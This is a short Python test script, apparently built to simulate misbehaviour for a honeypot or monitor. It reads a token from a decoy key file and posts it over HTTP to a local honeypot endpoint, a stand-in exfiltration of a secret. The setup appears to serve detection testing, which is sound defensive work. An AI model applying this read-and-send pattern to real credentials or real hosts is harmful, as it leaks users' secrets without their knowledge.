# runtime/misbehave.py
import pathlib, requests
DECOY_FILE = pathlib.Path("decoys/fake_key.txt")
HONEYPOT_URL = "http://127.0.0.1:9000/ingest"

token = DECOY_FILE.read_text(encoding="utf-8")
print("[misbehave] Read token from decoy:", token.strip(), flush=True)

# Send as raw text (no form encoding)
r = requests.post(HONEYPOT_URL, data=token, headers={"Content-Type": "text/plain"})
print("[misbehave] Sent to honeypot:", r.status_code, r.text)
